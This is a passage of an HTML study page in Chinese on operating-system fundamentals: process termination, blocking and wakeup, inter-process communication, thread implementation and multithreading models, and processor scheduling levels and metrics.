<li>若进程就绪队列能够接纳新进程，则将新进程插入就绪队列，等待被调度运行</li>
</ul>
</li>
<li>
<p><strong>进程的终止</strong></p>
<p><strong>引起进程终止的事件主要有</strong>：</p>
<ul>
<li><strong>正常结束</strong>：表示进程的任务已完成并准备退出运行</li>
<li><strong>异常结束</strong>：表示进程在运行时，发生了某种异常事件，使程序无法继续运行，如：存储区越界、非法指令、运行超时、算术运算错、I/O 故障等</li>
<li><strong>外界干预</strong>：指进程应外界的请求而终止运行，如：操作员或操作系统干预、父进程请求和父进程终止</li>
</ul>
<p><strong>终止进程的过程如下（终止原语）：</strong></p>
<ul>
<li>根据被终止进程的标识符，检索出该进程的 PCB，从中读出该进程的状态</li>
<li>若被终止进程处于运行状态，立即终止该进程的执行，将处理机资源分配给其他进程</li>
<li>若该进程还有子孙进程，则应将其所有子孙进程终止</li>
<li>将该进程所拥有的全部资源，或归还给其父进程，或归还给操作系统</li>
<li>将该 PCB 从所在队列（链表）中删除</li>
</ul>
</li>
<li>
<p><strong>进程的阻塞和唤醒</strong></p>
<p>正在执行的进程，由于期待的某些事件未发生，如：请求系统资源失败、等待某种操作的完成、新数据尚未到达或无新任务可做等，进程便通过调用阻塞原语（Block），使自己由运行态变为阻塞态。可见，阻塞是进程自身的一种主动行为，因此只有处于运行态的进程（获得 CPU），才可能将其转为阻塞态。<strong>阻塞原语的执行过程如下：</strong></p>
<ul>
<li>找到将要被阻塞进程的标识号对应的 PCB</li>
<li>若该进程为运行态，则保护其现场，将其状态转为阻塞态，停止运行</li>
<li>把该 PCB 插入相应事件的等待队列，将处理机资源调度给其他就绪进程</li>
</ul>
<p>当被阻塞进程所期待的事件出现时，如：它所期待的 <code>I/O</code> 操作已完成或其所期待的数据已到达，由有关进程（比如：释放该 <code>I/O</code> 设备的进程，或提供数据的进程）调用唤醒原语（Wakeup），将等待该事件的进程唤醒。<strong>唤醒原语的执行过程如下：</strong></p>
<ul>
<li>在该事件的等待队列中找到相应进程的 PCB</li>
<li>将其从等待队列中移出，并置其状态为就绪态</li>
<li>把该 PCB 插入就绪队列，等待调度程序调度</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>Block 原语和 Wakeup 原语是一对作用刚好相反的原语，必须成对使用。如果在某进程中调用了 Block 原语，则必须在与之合作的或其他相关的进程中安排一条相应的 Wakeup 原语，以便唤醒阻塞进程；否则，阻塞进程将会因不能被唤醒而永久地处于阻塞状态</p>
</div>
</li>
</ol>
<h4> 进程的通信</h4>
<p>进程通信是指进程之间的信息交换。PV 操作是低级通信方式，高级通信方式是指以较高的效率传输大量数据的通信方式。<strong>高级通信方法主要有以下三类：</strong></p>
<ol>
<li>
<p><strong>共享存储</strong></p>
<p>在通信的进程之间存在一块可直接访问的共享空间，通过对这片共享空间进行写/读操作实现进程之间的信息交换。在对共享空间进行写/读操作时，需要使用同步互斥工具（如：P 操作、V 操作）对共享空间的写/读进行控制。<strong>共享存储又分为两种：</strong></p>
<ul>
<li><strong>低级方式的共享</strong>：是基于数据结构的共享</li>
<li><strong>高级方式的共享</strong>：是基于存储区的共享</li>
</ul>
<p>操作系统只负责为通信进程提供可共享使用的存储空间和同步互斥工具，而数据交换则由用户自已安排读/写指令完成。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>进程空间一般都是独立的，进程运行期间一般不能访问其他进程的空间，想让两个进程共享空间，必须通过特殊的系统调用实现，而进程内的线程是自然共享进程空间的</p>
</div>
</li>
<li>
<p><strong>消息传递</strong></p>
<p>在消息传递系统中，进程间的数据交换以格式化的消息（Message）为单位。若通信的进程之间不存在可直接访问的共享空间，则必须利用操作系统提供的消息传递方法实现进程通信。进程通过系统提供的发送消息和接收消息两个原语进行数据交换。这种方式隐藏了通信实现细节，使通信过程对用户透明，简化了通信程序的设计，是当前应用最广泛的进程间通信机制。在微内核操作系统中，微内核与服务器之间的通信就采用了消息传递机制。由于该机制能很好地支持多处理机系统、分布式系统和计算机网络，因此也成为这些领域最主要的通信工具。</p>
<p><strong>消息传递方式如下：</strong></p>
<ul>
<li><strong>直接通信方式</strong>：发送进程直接把消息发送给接收进程，并将它挂在接收进程的消息缓冲队列上，接收进程从消息缓冲队列中取得消息</li>
<li><strong>间接通信方式</strong>：发送进程把消息发送到某个中间实体，接收进程从中间实体取得消息。这种中间实体一般称为信箱。该通信方式广泛应用于计算机网络中</li>
</ul>
</li>
<li>
<p><strong>管道通信</strong></p>
<p>管道通信允许两个进程按生产者-消费者方式进行通信，生产者向管道的一端写，消费者从管道的另一端读。数据在管道中是先进先出的。只要管道非空，读进程就能从管道中读出数据，若数据被读空，则读进程阻塞，直到写进程往管道中写入新的数据，再将读进程唤醒。只要管道不满，写进程就能往管道中写入数据，若管道写满，则写进程阻塞，直到读进程读出数据，再将写进程唤醒。为了协调双方的通信，管道机制必须提供三方面的协调能力：互斥、同步和确定对方的存在。</p>
<p>在 Linux 中，管道是一种使用非常频繁的通信机制。从本质上说，管道也是一种文件，但它又和一般的文件有所不同，管道可以克服使用文件进行通信的两个问题，具体表现如下：</p>
<ul>
<li><strong>限制管道的大小</strong>：管道文件是一个固定大小的缓冲区，在 Linux 中该缓冲区的大小为 4KB，这使得它的大小不像普通文件那样不加检验地增长。使用单个固定缓冲区也会带来问题，比如：在写管道时可能变满，这种情况发生时，随后对管道的 <code>write()</code> 调用将默认地被阻塞，等待某些数据被读取，以便腾出足够的空间供 <code>write()</code> 调用写</li>
<li><strong>读进程可能比写进程快</strong>：当所有管道内的数据已被读取时，管道变空。当这种情况发生时，一个随后的 <code>read()</code> 调用将默认地被阻塞，等待某些数据被写入，这解决了 <code>read()</code> 调用返回文件结束的问题</li>
</ul>
<p>管道只能由创建进程所访问，当父进程创建一个管道后，由于管道是一种特殊文件，子进程会继承父进程的打开文件，因此子进程也继承父进程的管道，并使用它来与父进程进进行通信。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>从管道读数据是一次性操作，数据一旦被读取，就释放空间以便写更多数据。普通管道只允许单向通信，若要实现父子进程双向通信，则需要定义两个管道</p>
</div>
</li>
</ol>
<h4> 线程和多线程模型</h4>
<ol>
<li>
<p><strong>线程的基本概念</strong></p>
<p>引入进程的目的是更好地使多道程序并发执行，提高资源利用率和系统吞吐量；而引入线程的目的则是 <strong>减小程序在并发执行时所付出的时空开销，提高操作系统的并发性能。</strong></p>
<p>线程最直接的理解就是 “轻量级进程”，它是一个基本的 CPU 执行单元，也是程序执行流的最小单元，由线程 ID、程序计数器、寄存器集合和堆栈组成。线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自已不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行。由于线程之间的相互制约，致使线程在运行中呈现出间断性。线程也有就绪、阻塞和运行三种基本状态。</p>
<p>引入线程后，进程的内涵发生了改变，进程只作为除 CPU 外的系统资源的分配单元，而线程则作为处理机的分配单元。由于一个进程内部有多个线程，若线程的切换发生在同一个进程内部，则只需要很少的时空开销。</p>
</li>
<li>
<p><strong>线程与进程的比较</strong></p>
<ul>
<li><strong>调度</strong>：在传统的操作系统中，拥有资源和独立调度的基本单位都是进程，每次调度都要进行上下文切换，开销较大。在引入线程的操作系统中，线程是独立调度的基本单位，而线程切换的代价远低于进程。在同一进程中，线程的切换不会引起进程切换。但从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换</li>
<li><strong>并发性</strong>：在引入线程的操作系统中，不仅进程之间可以并发执行，而且一个进程中的多个线程之间亦可并发执行，甚至不同进程中的线程也能并发执行，从而使操作系统具有更好的并发性，提高了系统资源的利用率和系统的吞吐量</li>
<li><strong>拥有资源</strong>：进程是系统中拥有资源的基本单位，而线程不拥有系统资源（仅有一点必不可少、能保证独立运行的资源），但线程可以访问其隶属进程的系统资源，这主要表现在属于同一进程的所有线程都具有相同的地址空间</li>
<li><strong>独立性</strong>：每个进程都拥有独立的地址空间和资源，除了共享全局变量，不允许其他进程访问。某进程中的线程对其他进程不可见。同一进程中的不同线程是为了提高并发性及进行相互之间的合作而创建的，它们共享进程的地址空间和资源</li>
<li><strong>系统开销</strong>：在创建或撤销进程时，系统都要为之分配或回收进程控制块 PCB 及其他资源，如：内存空间、<code>I/O</code> 设备等。操作系统为此所付出的开销，明显大于创建或撤销线程时的开销。类似地，在进程切换时涉及进程上下文的切换，而线程切换时只需保存和设置少量寄存器内容，开销很小。此外，由于同一进程内的多个线程共享进程的地址空间，因此这些线程之间的同步与通信非常容易实现，甚至无须操作系统的干预</li>
<li><strong>支持多处理机系统</strong>：对于传统单线程进程，不管有多少处理机，进程只能运行在一个处理机上。对于多线程进程，可以将进程中的多个线程分配到多个处理机上执行</li>
</ul>
</li>
<li>
<p><strong>线程的属性</strong></p>
<p>多线程操作系统中的进程已不再是一个基本的执行实体，但它仍具有与执行相关的状态。所谓进程处于 “执行” 状态，实际上是指该进程中的某线程正在执行。<strong>线程的主要属性如下：</strong></p>
<ul>
<li>线程是一个轻型实体，它不拥有系统资源，但每个线程都应有一个唯一的标识符和一个线程控制块，线程控制块记录了线程执行的寄存器和栈等现场状态</li>
<li>不同的线程可以执行相同的程序，即同一个服务程序被不同的用户调用时，操作系统把它们创建成不同的线程</li>
<li>同一进程中的各个线程共享该进程所拥有的资源</li>
<li>线程是处理机的独立调度单位，多个线程是可以并发执行的。在单 CPU 的计算机系统中，各线程可交替地占用 CPU；在多 CPU 的计算机系统中，各线程可同时占用不同的 CPU，若各个 CPU 同时为一个进程内的各线程服务，则可缩短进程的处理时间</li>
<li>一个线程被创建后，便开始了它的生命周期，直至终止。线程在生命周期内会经历阻塞态、就绪态和运行态等各种状态变化</li>
</ul>
<p>由于有了线程，线程切换时，有可能会发生进程切换，也有可能不发生进程切换，平均而言每次切换所需的开销就变小了，因此能够让更多的线程参与并发，而不会影响到响应时间等问题。</p>
</li>
<li>
<p><strong>线程的状态与转换</strong></p>
<p>与进程一样，各线程之间也存在共享资源和相互合作的制约关系，致使线程在运行时也具有间断性。<strong>线程在运行时也具有三种基本状态：</strong></p>
<ul>
<li><strong>执行状态</strong>：线程已获得处理机而正在运行</li>
<li><strong>就绪状态</strong>：线程已具备各种执行条件，只需再获得 CPU 便可立即执行</li>
<li><strong>阻塞状态</strong>：线程在执行中因某事件受阻而处于暂停状态</li>
</ul>
<p>线程这三种基本状态之间的转换和进程基本状态之间的转换是一样的。</p>
</li>
<li>
<p><strong>线程的组织与控制</strong></p>
<ul>
<li>
<p><strong>线程控制块</strong></p>
<p>系统为每个线程配置一个线程控制块（TCB），用于记录控制和管理线程的信息。<strong>线程控制块通常包括：</strong></p>
<ul>
<li>线程标识符</li>
<li>一组寄存器，包括程序计数器、状态寄存器和通用寄存器</li>
<li>线程运行状态，用于描述线程正处于何种状态</li>
<li>优先级</li>
<li>线程专有存储区，线程切换时用于保存现场等</li>
<li>堆栈指针，用于过程调用时保存局部变量及返回地址等</li>
</ul>
<p>同一进程中的所有线程都完全共享进程的地址空间和全局变量。各个线程都可以访问进程地址空间的每个单元，所以一个线程可以读、写或甚至清除另一个线程的堆栈。</p>
</li>
<li>
<p><strong>线程的创建</strong></p>
<p>线程也是具有生命期的，它由创建而产生，由调度而执行，由终止而消亡。在操作系统中就有用于创建线程和终止线程的函数（或系统调用）。</p>
<p>用户程序启动时，通常仅有一个称为 <strong>初始化线程</strong> 的线程正在执行，其主要功能是用于创建新线程。在创建新线程时，需要利用一个线程创建函数，并提供相应的参数，如：指向线程主程序的入口指针、堆栈的大小、线程优先级等。线程创建函数执行完后，将返回一个线程标识符。</p>
</li>
<li>
<p><strong>线程的终止</strong></p>
<p>当一个线程完成自已的任务后，或线程在运行中出现异常而要被强制终止时，由终止线程调用相应的函数执行终止操作。但是有些线程（主要是系统线程）一旦被建立，便一直运行而不会被终止。通常，线程被终止后并不立即释放它所占有的资源，只有当进程中的其他线程执行了分离函数后，被终止线程才与资源分离，此时的资源才能被其他线程利用。</p>
<p>被终止但尚未释放资源的线程仍可被其他线程调用，以使被终止线程重新恢复运行。</p>
</li>
</ul>
</li>
<li>
<p><strong>线程的实现方式</strong></p>
<p>线程的实现可以分为两类：<strong>用户级线程</strong>（User-Level Thread，ULT）和 <strong>内核级线程</strong>（Kernel-Level Thread，KLT）。内核级线程又称内核支持的线程。</p>
<ul>
<li>
<p><strong>用户级线程（ULT）</strong></p>
<p>有关线程管理（创建、撤销和切换等）的所有工作都由应用程序在用户空间中完成，内核意识不到线程的存在。应用程序可以通过使用线程库设计成多线程程序。通常，应用程序从单线程开始，在该线程中开始运行，在其运行的任何时刻，可以通过调用线程库中的派生例程创建一个在相同进程中运行的新线程。</p>
<p>对于设置了用户级线程的系统，其调度仍是以进程为单位进行的，各个进程轮流执行一个时间片。假设进程 <code>A</code> 包含 <code>1</code> 个用户级线程，进程 <code>B</code> 包含 <code>100</code> 个用户级线程，这样，进程 <code>A</code> 中线程的运行时间将是进程 <code>B</code> 中各线程运行时间的 <code>100</code> 倍，因此对线程来说实质上是不公平的。）</p>
<p><strong>优点：</strong></p>
<ul>
<li>线程切换不需要转换到内核空间，<strong>节省模式切换的开销</strong></li>
<li>调度算法可以是进程专用的，不同的进程可根据自身的需要，对自已的线程 <strong>选择不同的调度算法</strong></li>
<li><strong>用户级线程的实现与操作系统平台无关</strong>，对线程管理的代码是属于用户程序的一部分</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>系统调用的阻塞问题，当 <strong>线程执行一个系统调用时，不仅该线程被阻塞</strong>，而且 <strong>进程内的所有线程都被阻塞</strong></li>
<li><strong>不能发挥多处理机的优势</strong>，内核每次分配给一个进程的仅有一个 CPU，因此进程中仅有一个线程能执行</li>
</ul>
</li>
<li>
<p><strong>内核级线程（KLT）</strong></p>
<p>在操作系统中，无论是系统进程还是用户进程，都是在操作系统内核的支持下运行的，与内核紧密相关。内核级线程同样也是在内核的支持下运行的，线程管理的所有工作也是在内核空间内实现的。内核空间也为每个内核级线程设置一个线程控制块，内核根据该控制块感知某线程的存在，并对其加以控制。</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>能发挥多处理机的优势</strong>，内核能同时调度同一进程中的多个线程并行执行</li>
<li>如果进程中的 <strong>一个线程被阻塞，内核可以调度该进程中的其他线程占用处理机</strong>，也可运行其他进程中的线程</li>
<li>内核支持线程具有很小的数据结构和堆栈，<strong>线程切换比较快、开销小</strong></li>
<li>内核本身也可采用多线程技术，可以 <strong>提高系统的执行速度和效率</strong></li>
</ul>
<p><strong>缺点</strong>：同一进程中的线程切换，需要从用户态转到核心态进行，系统开销较大。这是因为用户进程的线程在用户态运行，而线程调度和管理是在内核实现的。</p>
</li>
<li>
<p><strong>组合方式</strong></p>
<p>有些系统使用组合方式的多线程实现。在组合实现方式中，内核支持多个内核级线程的建立、调度和管理，同时允许用户程序建立、调度和管理用户级线程。一些内核级线程对应多个用户级线程，这是用户级线程通过时分多路复用内核级线程实现的。同一进程中的多个线程可以同时在多处理机上并行执行，且在阻塞一个线程时不需要将整个进程阻塞，所以组合方式能结合 KLT 和 ULT 的优点，并且克服各自的不足。</p>
<p>通过线程库来创建和管理线程。<strong>线程库</strong>（thread library）是为程序员提供创建和管理线程的 API。实现线程库主要的方法有如下两种：</p>
<ul>
<li>在用户空间中提供一个没有内核支持的库。这种库的所有代码和数据结构都位于用户空间中。这意味着，调用库内的一个函数只导致用户空间中的一个本地函数的调用</li>
<li>实现由操作系统直接支持的内核级的一个库。对于这种情况，库内的代码和数据结构位于内核空间。调用库中的一个 API 函数通常会导致对内核的系统调用</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>多线程模型</strong></p>
<p>有些系统同时支持用户线程和内核线程，由于用户级线程和内核级线程连接方式的不同，从而形成了下面三种不同的多线程模型。</p>
<ul>
<li>
<p><strong>多对一模型</strong></p>
<p>将多个用户级线程映射到一个内核级线程。这些用户线程一般属于一个进程，线程的调度和管理在用户空间完成。仅当用户线程需要访问内核时，才将其映射到一个内核级线程上，每次只允许一个线程进行映射。</p>
<p><strong>优点</strong>：线程管理是在用户空间进行的，因而效率比较高</p>
<p><strong>缺点</strong>：如果一个线程在访问内核时发生阻塞，则整个进程都会被阻塞；在任何时刻，只有一个线程能够访问内核，多个线程不能同时在多个处理机上运行</p>
</li>
<li>
<p><strong>一对一模型</strong></p>
<p>将每个用户级线程映射到一个内核级线程。</p>
<p><strong>优点</strong>：当一个线程被阻塞后，允许调度另一个线程运行，所以并发能力较强</p>
<p><strong>缺点</strong>：每创建一个用户线程，相应地就需要创建一个内核线程，开销较大</p>
</li>
<li>
<p><strong>多对多模型</strong></p>
<p>将 <code>n</code> 个用户线程映射到 <code>m</code> 个内核级线程上，要求 <code>n ≥ m</code>。</p>
<p><strong>特点</strong>：既克服了多对一模型并发度不高的缺点，又克服了一对一模型的一个用户进程占用太多内核级线程而开销太大的缺点。此外，还拥有上述两种模型各自的优点。</p>
</li>
</ul>
</li>
</ol>
<h3> 处理机调度</h3>
<h4> 调度的概念</h4>
<ol>
<li>
<p><strong>调度的基本概念</strong></p>
<p>在多道程序系统中，进程的数量往往多于处理机的个数，因此进程争用处理机的情况在所难免。<strong>处理机调度是对处理机进行分配</strong>，即从就绪队列中按照一定的算法（公平、高效的原则）选择一个进程并将处理机分配给它运行，以实现进程并发地执行。</p>
<p>处理机调度是多道程序操作系统的基础，是操作系统设计的核心问题。</p>
</li>
<li>
<p><strong>调度的层次</strong></p>
<p>一个作业从提交开始直到完成，往往要经历以下三级调度：</p>
<ul>
<li>
<p><strong>高级调度（作业调度）</strong></p>
<p>按照一定的原则从外存上处于后备队列的作业中挑选一个（或多个），给它（们）分配内存、输入/输出设备等必要的资源，并建立相应的进程，以使它（们）获得竞争处理机的权利。<strong>作业调度就是内存与辅存之间的调度。每个作业只调入一次、调出一次。</strong></p>
<p>多道批处理系统中大多配有作业调度，而其他系统中通常不需要配置作业调度。</p>
</li>
<li>
<p><strong>中级调度（内存调度）</strong></p>
<p>引入中级调度的目的是提高内存利用率和系统吞吐量。为此，将那些暂时不能运行的进程调至外存等待，此时进程的状态称为挂起态。当它们已具备运行条件且内存又稍有空闲时，由中级调度来决定把外存上的那些已具备运行条件的就绪进程再重新调入内存，并修改其状态为就绪态，挂在就绪队列上等待。<strong>中级调度实际上是存储器管理中的对换功能。</strong></p>
</li>
<li>
<p><strong>低级调度（进程调度）</strong></p>
<p>按照某种算法从就绪队列中选取一个进程，将处理机分配给它。进程调度是最基本的一种调度，在各种操作系统中都必须配置这级调度。进程调度的频率很高，一般几十毫秒一次。</p>
</li>
</ul>
</li>
<li>
<p><strong>三级调度的联系</strong></p>
<p>作业调度从外存的后备队列中选择一批作业进入内存，为它们建立进程，这些进程被送入就绪队列，进程调度从就绪队列中选出一个进程，并把其状态改为运行态，把 CPU 分配给它。中级调度是为了提高内存的利用率，系统将那些暂时不能运行的进程挂起来。</p>
<ul>
<li>作业调度为进程活动做准备，进程调度使进程正常活动起来</li>
<li>中级调度将暂时不能运行的进程挂起，中级调度处于作业调度和进程调度之间</li>
<li>作业调度次数少，中级调度次数略多，进程调度频率最高</li>
<li>进程调度是最基本的，不可或缺</li>
</ul>
</li>
</ol>
<h4> 调度的目标</h4>
<p>不同的调度算法具有不同的特性，在选择调度算法时，必须考虑算法的特性。为了比较处理机调度算法的性能，人们提出了很多评价标准，下面介绍其中主要的几种：</p>
<ol>
<li>
<p><strong>CPU 利用率</strong></p>
<p>CPU 是计算机系统中最重要和昂贵的资源之一，所以应尽可能使 CPU 保持 “忙” 状态，使这一资源利用率最高。<strong>CPU 利用率的计算方法如下：</strong></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>P</mi><mi>U</mi><mtext>的利用率</mtext><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>C</mi><mi>P</mi><mi>U</mi><mtext>有效工作时间</mtext></mrow><mrow><mi>C</mi><mi>P</mi><mi>U</mi><mtext>有效工作时间</mtext><mo>+</mo><mi>C</mi><mi>P</mi><mi>U</mi><mtext>空闲等待时间</mtext></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">CPU \text{的利用率} = \dfrac{CPU \text{有效工作时间}} {CPU \text{有效工作时间} + CPU \text{空闲等待时间}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">CP</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord text"><span class="mord cjk_fallback">的利用率</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1297em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">CP</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord text"><span class="mord cjk_fallback">有效工作时间</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">CP</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord text"><span class="mord cjk_fallback">空闲等待时间</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">CP</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord text"><span class="mord cjk_fallback">有效工作时间</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
</li>
<li>
<p><strong>系统吞吐量</strong></p>
<p>表示单位时间内 CPU 完成作业的数量。长作业需要消耗较长的处理机时间，因此会降低系统的吞吐量。而对于短作业，需要消耗的处理机时间较短，因此能提高系统的吞吐量。调度算法和方式的不同，也会对系统的吞吐量产生较大的影响。</p>
</li>
<li>
<p><strong>周转时间</strong></p>
<p>指从作业提交到作业完成所经历的时间，是作业等待、在就绪队列中排队、在处理机上运行及输入/输出操作所花费时间的总和。周转时间的计算方法如下：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>周转时间</mtext><mo>=</mo><mtext>作业完成时间</mtext><mo>−</mo><mtext>作业提交时间</mtext></mrow><annotation encoding="application/x-tex">\text{周转时间} = \text{作业完成时间} - \text{作业提交时间}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">周转时间</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord cjk_fallback">作业完成时间</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">作业提交时间</span></span></span></span></span></p>
<p>平均周转时间是指多个作业周转时间的平均值：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>平均周转时间</mtext><mo>=</mo><mo stretchy="false">(</mo><mtext>作业&nbsp;1&nbsp;的周转时间</mtext><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mtext>作业&nbsp;n&nbsp;的周转时间</mtext><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">\text{平均周转时间} = (\text{作业 1 的周转时间} + ... + \text{作业 n 的周转时间}) / n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">平均周转时间</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">作业</span><span class="mord">&nbsp;1&nbsp;</span><span class="mord cjk_fallback">的周转时间</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord cjk_fallback">作业</span><span class="mord">&nbsp;n&nbsp;</span><span class="mord cjk_fallback">的周转时间</span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">n</span></span></span></span></p>
<p>带权周转时间是指作业周转时间与作业实际运行时间的比值：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>带权周转时间</mtext><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext>作业周转时间</mtext><mtext>作业实际运行时间</mtext></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\text{带权周转时间} = \dfrac{\text{作业周转时间}} {\text{作业实际运行时间}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">带权周转时间</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0463em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">作业实际运行时间</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">作业周转时间</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>平均带权周转时间是指多个作业带权周转时间的平均值：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>平均带权周转时间</mtext><mo>=</mo><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">\text{平均带权周转时间} = (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">平均带权周转时间</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>\text{作业 1 的带权周转时间} + ... + <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>作业&nbsp;n&nbsp;的带权周转时间</mtext><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">\text{作业 n 的带权周转时间}) / n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord cjk_fallback">作业</span><span class="mord">&nbsp;n&nbsp;</span><span class="mord cjk_fallback">的带权周转时间</span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">n</span></span></span></span></p>
</li>
<li>
<p><strong>等待时间</strong></p>
<p>指进程处于等处理机的时间之和，等待时间越长，用户满意度越低。处理机调度算法实际上并不影响作业执行或输入/输出操作的时间，只影响作业在就绪队列中等待所花的时间。因此，衡量一个调度算法的优劣，常常只需简单地考察等待时间。</p>
</li>
<li>
<p><strong>响应时间</strong></p>
<p>指从用户提交请求到系统首次产生响应所用的时间。在交互式系统中，周转时间不是最好的评价准则，一般采用响应时间作为衡量调度算法的重要准则之一。从用户角度来看，调度策略应尽量降低响应时间，使响应时间处在用户能接受的范围之内。</p>
</li>
</ol>
<p>要想得到一个满足所有用户和系统要求的算法几乎是不可能的。设计调度程序，一方面要满足特定系统用户的要求（如：某些实时和交互进程的快速响应要求），另一方面要考虑系统整体效率（如：减少整个系统的进程平均周转时间），同时还要考虑调度算法的开销。</p>
<h4> 调度的实现</h4>
<ol>
<li>
<p><strong>调度程序（调度器）</strong></p>
<p>用于调度和分派 CPU 的组件称为调度程序，它通常由三部分组成：</p>
<ul>
